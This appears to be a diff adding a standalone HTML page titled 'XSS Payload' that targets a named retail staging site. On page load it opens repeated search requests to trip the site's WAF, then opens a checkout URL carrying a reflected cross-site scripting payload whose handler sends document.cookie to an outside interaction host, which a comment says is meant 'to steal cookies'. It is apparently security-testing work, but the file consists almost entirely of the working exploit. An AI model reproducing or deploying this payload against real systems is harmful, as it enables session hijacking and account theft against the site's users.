@@ -1,0 +1,29 @@
+<html>
+<head><title>XSS Payload</title></head>
+<body>
+
+<script>
+  function submitRequests() {
+    // Send 10 GET requests to trigger WAF page
+    for (let i = 0; i < 5; i++) {
+      const url = "https://qualif.coursesu.com/on/demandware.store/Sites-DigitalU-Site/fr_FR/Search-GetSuggestions?q=%3Cscript%3Eal&format=ajax";
+      window.open(url, "_blank");
+    }
+  }
+
+  window.onload = function () {
+    submitRequests();
+    // Send a single POST request to my Burp Collab Webhook to steal cookies
+    setTimeout(function () {
+      const finalUrl = "https://qualif.coursesu.com/on/demandware.store/Sites-DigitalU-Site/fr_FR/Checkout-Submitajaxy'}</" + "script>asdasd<marquee%20onstart=fetch(\"/xxxx/cj1pras2vtc00002gmc0gjy5cfoyyyyyb.oast.fun\".replaceAll(\"xxxx\",[]),{method:'POST',mode:'no-cors',body:document.cookie})>hello</marquee>";
+      window.open(finalUrl, "_blank");
+    }, 2000);
+  };
+</script>
+
+<form onsubmit="event.preventDefault();">
+  <input type="submit" value="Submit">
+</form>
+</body>
+
+ </html>
